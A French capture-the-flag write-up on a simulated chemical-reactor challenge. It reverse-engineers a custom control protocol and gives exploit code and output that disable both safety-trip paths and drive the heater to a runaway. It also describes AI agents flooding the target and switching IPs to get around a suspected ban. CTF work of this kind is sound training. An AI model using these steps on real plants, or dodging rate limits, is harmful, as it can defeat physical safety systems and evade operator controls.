# OT-004 — Chemical Reactor  · Writeup

- **Catégorie :** OT / ICS · **Points :** 128 · **Source :** otctf.pages.dev (Cyber.industries CTF)
- **Cible :** `169.58.126.107:6003` — « OPC-UA-inspired » custom TCP
- **Flag :** `CTF{59cbb10f52f0f0eb26f765b05b7144ed}`

## 1. Énoncé

Interface de contrôle d'un réacteur chimique parlant un protocole inspiré d'OPC-UA :
handshake de session, puis Browse/Read/Write sur un petit address space de nodes
numérotés. Le réacteur a un **système de sécurité indépendant (SIS)** censé stopper
un emballement quoi que fasse le contrôleur de procédé. **Objectif : faire que cette
protection ne s'applique plus** et récupérer le flag (simulation, « schematic, not
live telemetry »).

## 2. Recon

- `file`/strings/scan : service TCP muet, **n'envoie aucune bannière** — il attend que
  le client parle en premier.
- La page annonce : root node **Objects (ns=0, i=85)**, flag `CTF{...}`, pas de
  corruption mémoire, address space à découvrir en parlant au endpoint.
- Le `ns=0;i=85` ressemble au nodeId standard OPC-UA → **fausse piste** : on en a déduit
  « vrai OPC-UA, un client asyncua va marcher ».

## 3. La fausse piste (et la leçon)

On a envoyé des **HELLO OPC-UA** (asyncua + HELLO faits main, toutes tailles de buffer,
plusieurs endpoint URLs). Résultat constant : le serveur **ferme ~2.3s après n'importe
quel envoi, sans jamais répondre** (ni ACK ni ERR). En revanche, une connexion TCP où
l'on **n'envoie rien** reste ouverte.

Comportement observé :
| Envoi | Résultat |
|---|---|
| rien | connexion reste ouverte > plusieurs secondes |
| HELLO OPC-UA (toutes variantes) | fermée ~2.3s, 0 octet en retour |
| 16 octets aléatoires / `0xff` | fermée ~2.3s, 0 octet en retour |

Un agent avait auparavant **martelé** le port (350-650 connexions). On a donc conclu à
un **IP ban/rate-limit** et on s'est enferré là-dedans pendant >1 jour (cooldowns,
« tester depuis une autre IP »). **C'était faux.**

> **Leçon :** « ferme sur tout input / ne répond jamais » = d'abord un problème de
> **framing**, pas un ban. Un vrai ban drop le SYN ou RST vite ; ici c'était un close
> applicatif propre après timeout de lecture = le serveur rejette une **trame qu'il ne
> reconnaît pas**. On n'avait simplement jamais envoyé le bon premier message.

## 4. Le vrai protocole (reverse via l'agent GLM depuis une autre IP)

Dans l'orchestration multi-agents, **glm_brain (Z.ai en mode agent, sur une IP
différente)** a exploré la cible et reconstruit le **transport custom** — le modèle de
nodes est OPC-UA-style (ns/id) mais le **wire format n'a rien d'OPC-UA** :

**Framing :** `struct.pack("<BI", opcode, len(payload)) + payload`
→ 1 octet opcode + 4 octets longueur (little-endian) + payload. Réponse : même header
`<BI>` (opcode | 0x80) + body.

| Opcode | Rôle | Payload | Réponse |
|---|---|---|---|
| `0x01` | handshake | (vide) | `0x81` + `uint32` **session ID** |
| `0x03` | read node | `<IHI>` = session, ns, id | status + valeur type-taggée |
| `0x04` | write node | `<IHI>` + type + valeur | status (`body[4]`, 0 = OK) |

**Type tags (read) :** 1=int32, 2=float64, 3=bool, 4=string (`<H>` len + utf-8).

**Node map :**
| ns:id | nom | type |
|---|---|---|
| 1:1001 | HeaterPower | f64 (W) |
| 1:1002 | Temp | f64 |
| 1:1003 | Pressure | f64 |
| 2:2001 | **TripEnable** | bool (W) |
| 2:2003 | Tripped | bool |
| 2:2004 | **Flag** | string |
| 2:2008 | **PretripLatch** | bool (W) |

## 5. Exploit

Neutraliser les **deux** chemins de trip actifs (`TripEnable` et `PretripLatch`), pousser
`HeaterPower` à fond, puis lire en boucle jusqu'à ce que le node `Flag` se remplisse —
le serveur valide l'état dangereux soutenu (Temp monte, `Tripped` reste False) et révèle
le flag. Script complet : `work/exploit_zai.py`. Cœur :

```python
sid = handshake(s)                       # op 0x01 -> session id
write_bool(s, sid, 2, 2001, False)       # TripEnable  = False
write_bool(s, sid, 2, 2008, False)       # PretripLatch = False
write_f64 (s, sid, 1, 1001, 100.0)       # HeaterPower  = 100
while True:                              # lire jusqu'au flag
    flag = read_node(s, sid, 2, 2004)
    if flag: print(flag); break
```

Sortie réelle (depuis notre propre IP — jamais bannie) :
```
[+] Session ID: 1
[+] TripEnable=False   -> 0
[+] PretripLatch=False -> 0
[+] HeaterPower=100.0  -> 0
[0.0s] T=19.71C  P=2.91bar  Tripped=False Flag=''
[0.5s] T=350.42C P=8.68bar  Tripped=False Flag=''
[1.0s] T=514.46C P=11.76bar Tripped=False Flag='CTF{59cbb10f52f0f0eb26f765b05b7144ed}'
```

## 6. Flag

```
CTF{59cbb10f52f0f0eb26f765b05b7144ed}
```

## 7. À retenir

1. **« OPC-UA-inspired » ≠ OPC-UA.** Le modèle de nodes peut être OPC-UA-style alors que
   le transport est entièrement custom. Ne pas supposer qu'un client OPC-UA standard parlera.
2. **Ne pas conclure « IP ban » trop vite** (cf. §3) — tester d'abord d'autres framings.
3. **L'orchestration multi-agents a payé** : l'agent GLM (IP différente, exploration libre)
   a cracké le framing que l'analyse mono-piste avait mal diagnostiqué ; l'orchestrateur a
   ensuite rejoué l'exploit depuis notre IP → flag. C'est exactement l'intérêt de faire
   tourner plusieurs cerveaux en parallèle sur un blackboard partagé.
